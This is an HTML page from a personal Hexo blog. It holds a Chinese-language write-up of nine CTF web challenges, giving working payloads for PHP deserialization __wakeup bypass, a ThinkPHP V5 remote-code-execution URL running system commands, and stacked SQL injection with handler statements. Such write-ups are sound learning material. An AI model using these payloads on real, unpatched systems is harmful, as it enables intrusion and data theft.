@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+    <title>
+        web进阶 | Ma4out7
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <link rel="shortcut icon" href="/images/favicon.png">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <script id="hexo-configurations">
+    let CONFIG = {"hostname":"example.com","root":"/","localsearch":{"enable":true,"trigger":"auto","unescape":false,"preload":false},"themeInfo":{"name":"ILS","version":"2.0.2","author":"XPoet","repository":"https://github.com/XPoet/hexo-theme-ils"}};
+  </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+
+        <a class="logo-title" href="/">
+            Ma4out7
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <h3><a class="title-hover-animation">web进阶</a></h3>
+        </div>
+
+        <div class="meta-info">
+            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa fa-calendar-o"></i> 2020-10-16 16:10:05
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/">功防世界</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+    
+    
+</div>
+
+        </div>
+
+        <div class="article-content markdown-body">
+            <h2 id="1-Training-WWW-Robots"><a href="#1-Training-WWW-Robots" class="headerlink" title="1.Training-WWW-Robots"></a>1.Training-WWW-Robots</h2><p>根据题目，直接找robots.txt 文件，发现里面有敏感文件fl0g.php文件，再次访问，得到flag。</p>
+<h2 id="2-unserialize3"><a href="#2-unserialize3" class="headerlink" title="2.unserialize3"></a>2.unserialize3</h2><p>看到题目不知道是个啥，所以找到相关wp！</p>
+<h2 id="考查知识点："><a href="#考查知识点：" class="headerlink" title="考查知识点："></a>考查知识点：</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/LTtiandd/article/details/99591998?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160283670919195240424613%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160283670919195240424613&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-2-99591998.first_rank_ecpm_v3_pc_rank_v2&utm_term=unserialize3&spm=1018.2118.3001.4187"> PHP序列化和反序列 </a>。可以从why（php文件执行后会销毁对象，序列化后可以长久保存对象），what（对象和字符串的转换），how（通过对应的函数（serialize）三个方面来学习它。</li>
+<li>各种魔法函数绕过（此题是__ wakeup函数）</li>
+<li>手动构造反序列化后的字符串。</li>
+</ul>
+<h2 id="解题步骤："><a href="#解题步骤：" class="headerlink" title="解题步骤："></a>解题步骤：</h2><p>源码可得是绕过_wakeup函数，所以需要更改序列化之后的属性（这里改变属性的数量），即可绕或。</p>
+<p>提示了<code>?code =</code>，构造对应字符串  O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}。</p>
+<h2 id="3-Web-php-unserialize"><a href="#3-Web-php-unserialize" class="headerlink" title="3.Web_php_unserialize"></a>3.Web_php_unserialize</h2><h3 id="考查知识点：-1"><a href="#考查知识点：-1" class="headerlink" title="考查知识点："></a>考查知识点：</h3><ul>
+<li>php序列化和反序列</li>
+<li>绕过正则表达式    </li>
+<li>序列化绕过_wakeup函数</li>
+</ul>
+<p>注意：由源码提示，此处构造对象时的文件名应该是“fl4g.php”.</p>
+<h2 id="解题步骤：-1"><a href="#解题步骤：-1" class="headerlink" title="解题步骤："></a>解题步骤：</h2><ol>
+<li>构建对象，文件名“fl4g.php”</li>
+<li>序列化，更改属性，绕过正则表达式。</li>
+<li>base64 加密。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123;</span><br><span class="line">    private $file &#x3D; &#39;index.php&#39;;</span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file &#x3D; $file;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        echo @highlight_file($this-&gt;file, true);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup() &#123;</span><br><span class="line">        if ($this-&gt;file !&#x3D; &#39;index.php&#39;) &#123;</span><br><span class="line">            &#x2F;&#x2F;the secret is in the fl4g.php</span><br><span class="line">            $this-&gt;file &#x3D; &#39;index.php&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$A &#x3D; new Demo (&#39;fl4g.php&#39;);</span><br><span class="line">$C &#x3D; serialize($A);                     &#x2F;&#x2F;改变属性绕过wake up 函数</span><br><span class="line">$C &#x3D; str_replace(&#39;O:4&#39;,&#39;O:+4&#39;,$C);      &#x2F;&#x2F;绕过正则表达式过滤</span><br><span class="line">$C &#x3D; str_replace(&#39;:1:&#39;,&#39;:2:&#39;,$C); </span><br><span class="line">var_dump($C);</span><br><span class="line">var_dump(base64_encode($C));            &#x2F;&#x2F;base64加密</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-php-rce"><a href="#4-php-rce" class="headerlink" title="4.php_rce"></a>4.php_rce</h2><h3 id="考查知识点：-2"><a href="#考查知识点：-2" class="headerlink" title="考查知识点："></a>考查知识点：</h3><ul>
+<li>ThinkPHP V5漏洞复现</li>
+<li>rce(远程代码执行)</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/191847.html">ThinkPHP V5 漏洞</a></p>
+<h3 id="解题步骤：-2"><a href="#解题步骤：-2" class="headerlink" title="解题步骤："></a>解题步骤：</h3><ol>
+<li><p>看不懂漏洞，只能模仿着来，</p>
+<p><code>/index.php/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p>
+<p>返回了PHP信息。</p>
+</li>
+<li><p>rce是不是系统代码访问呢？</p>
+<p><code>/index.php/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code></p>
+<p>返回文件信息，看到了flag文件.</p>
+</li>
+<li><p>继续系统命令：</p>
+<p><code>/index.php/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
+<p>得到flag。</p>
+</li>
+</ol>
+<p>体会：没想到居然会考察漏洞复现，没想到。没办法只能👀wp,以后有时间，可以多复现几个漏洞。</p>
+<h2 id="5-Web-php-include"><a href="#5-Web-php-include" class="headerlink" title="5.Web_php_include"></a>5.Web_php_include</h2><h3 id="考查知识点"><a href="#考查知识点" class="headerlink" title="考查知识点"></a>考查知识点</h3><ul>
+<li><p>文件包含漏洞（include和各种伪协议）</p>
+</li>
+<li><p>str_replace()函数绕过方法：</p>
+<ol>
+<li>双写绕过</li>
+<li>大小写绕过</li>
+</ol>
+<p>详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43400976/article/details/107510537?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">Web_php_include多种解法</a></p>
+</li>
+</ul>
+<h2 id="6-supersqli-随便注"><a href="#6-supersqli-随便注" class="headerlink" title="6.supersqli(随便注)"></a>6.supersqli(随便注)</h2><p>考察知识点：</p>
+<ul>
+<li>主要是堆叠注入</li>
+<li>绕过关键字正则表达式</li>
+</ul>
+<p>解法步骤：</p>
+<p>注意：此题用<code>--+</code>来注释,<code>#</code>注释没反应</p>
+<ol>
+<li><p>基本顺序，判断注入类型，order by来获取列数。</p>
+</li>
+<li><p>发现select等关键字被过滤，所以选择使用堆叠注入(多条语句)</p>
+</li>
+<li><p><code>show tables --+</code>得到表名，<code>show columns from  表明 </code>得到flag字段。</p>
+</li>
+<li><p>关键词被过滤，如何访问flag字段的内容呢？</p>
+<p> 具有三种方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/108583338?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160284534019724848327199%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160284534019724848327199&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-4-108583338.first_rank_ecpm_v3_pc_rank_v2&utm_term=supersqli&spm=1018.2118.3001.4187">三种方法解sqpersqli</a></p>
+<ol>
+<li><p>mysql数据库可以通过handler来访问。</p>
+<p><code>1&#39;;handler 1919810931114514 open;</code></p>
+<p><code>handler 1919810931114514 read first;#</code></p>
+</li>
+<li><p>通过预编译来绕过</p>
+</li>
+<li><p>通过更改字段名和表明，调换falg字段所在表的字段名和words表的字段名，则现在调用的words表和字段就是以前的falg所在的表和字段，从而达到访问的目的。</p>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="7-ics-06"><a href="#7-ics-06" class="headerlink" title="7.ics-06"></a>7.ics-06</h2><h3 id="考查知识点-1"><a href="#考查知识点-1" class="headerlink" title="考查知识点"></a>考查知识点</h3><ul>
+<li>id变量的遍历</li>
+</ul>
+<p>看到题目，只有报表中心可以进去，在URL发现id变量，想到sql注入，试了几下没反应，然后没办法，之后再知道是id的遍历，再次借助burpsuite爆破，直到id=2333时才得到flag。</p>
+<h2 id="8-warmup"><a href="#8-warmup" class="headerlink" title="8.warmup"></a>8.warmup</h2><h3 id="考查知识点-2"><a href="#考查知识点-2" class="headerlink" title="考查知识点"></a>考查知识点</h3><ul>
+<li>通过php代码的审计来绕过</li>
+</ul>
+<p>解题步骤：</p>
+<ol>
+<li>查看HTML代码，看到注释有source.php文件。</li>
+<li>URL打开，发现有hint.php文件，打开，发现flag在ffffflllllaaaagggg文件中，PHP代码审计绕过。</li>
+<li>include文件包含达到flag。</li>
+</ol>
+<p>详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/nicesa/article/details/106344039?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160284913319195264749632%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160284913319195264749632&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-106344039.first_rank_ecpm_v3_pc_rank_v2&utm_term=warmup&spm=1018.2118.3001.4187">warmup</a></p>
+<h2 id="9-NaNNaNNaNNaN-Batman"><a href="#9-NaNNaNNaNNaN-Batman" class="headerlink" title="9.NaNNaNNaNNaN-Batman"></a>9.NaNNaNNaNNaN-Batman</h2><h3 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h3><ul>
+<li>eval()函数的作用，把参数当做script语言执行。</li>
+<li>alert()函数使用。</li>
+<li>PHP代码审计</li>
+</ul>
+<p>没想到，乱码中还有可以看懂的eval()函数，可能由于eval(__)执行，导致乱码。</p>
+<p>alert通知框中的到正确的代码，从中得到flag。</p>
+
+        </div>
+
+        <div class="article-nav">
+            
+            
+                <div class="article-next">
+                    <a class="next btn"
+                       rel="next"
+                       href="/2020/10/16/web%E6%96%B0%E6%89%8B%E9%A2%98/"
+                    >
+                        <span class="post-nav-title-item">web新手题</span><span class="post-nav-item">Next posts</span> <i class="fa fa-chevron-right"></i>
+                    </a>
+                </div>
+            
+        </div>
+
+        <div class="comment-container">
+            <div class="comments-container">
+    
+        
+
+    
+</div>
+        </div>
+    </div>
+</div>
+
+
+                    
+
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy; 2020 <i class="fa fa-heart-o"></i> <a href="/">John Doe</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a
+                    href="https://github.com/XPoet/hexo-theme-ils" target="_blank">ILS v2.0.2</a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fa fa-search"></i>
+            </li>
+            
+<script src="/js/local-search.js"></script>
+
+        
+        <li class="mode-toggle">
+            <i class="fa fa-moon-o"></i>
+        </li>
+        
+        <li class="page-aside-toggle">
+            <i class="fa fa-bars"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Training-WWW-Robots"><span class="nav-number">1.</span> <span class="nav-text">1.Training-WWW-Robots</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-unserialize3"><span class="nav-number">2.</span> <span class="nav-text">2.unserialize3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E6%9F%A5%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">考查知识点：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">解题步骤：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Web-php-unserialize"><span class="nav-number">5.</span> <span class="nav-text">3.Web_php_unserialize</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E6%9F%A5%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-1"><span class="nav-number">5.1.</span> <span class="nav-text">考查知识点：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4%EF%BC%9A-1"><span class="nav-number">6.</span> <span class="nav-text">解题步骤：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-php-rce"><span class="nav-number">7.</span> <span class="nav-text">4.php_rce</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E6%9F%A5%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-2"><span class="nav-number">7.1.</span> <span class="nav-text">考查知识点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4%EF%BC%9A-2"><span class="nav-number">7.2.</span> <span class="nav-text">解题步骤：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Web-php-include"><span class="nav-number">8.</span> <span class="nav-text">5.Web_php_include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E6%9F%A5%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">8.1.</span> <span class="nav-text">考查知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-supersqli-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="nav-number">9.</span> <span class="nav-text">6.supersqli(随便注)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-ics-06"><span class="nav-number">10.</span> <span class="nav-text">7.ics-06</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E6%9F%A5%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">10.1.</span> <span class="nav-text">考查知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-warmup"><span class="nav-number">11.</span> <span class="nav-text">8.warmup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E6%9F%A5%E7%9F%A5%E8%AF%86%E7%82%B9-2"><span class="nav-number">11.1.</span> <span class="nav-text">考查知识点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-NaNNaNNaNNaN-Batman"><span class="nav-number">12.</span> <span class="nav-text">9.NaNNaNNaNNaN-Batman</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E5%AF%9F%E7%82%B9"><span class="nav-number">12.1.</span> <span class="nav-text">考察点</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fa fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/js/main.js"></script>
+<script src="/js/header-shrink.js"></script>
+<script src="/js/toggle-mode.js"></script>
+
+
+
+
+
+
+    
+        
+<script src="/js/code-copy.js"></script>
+
+    
+
+    
+
+
+
+</body>
+</html>
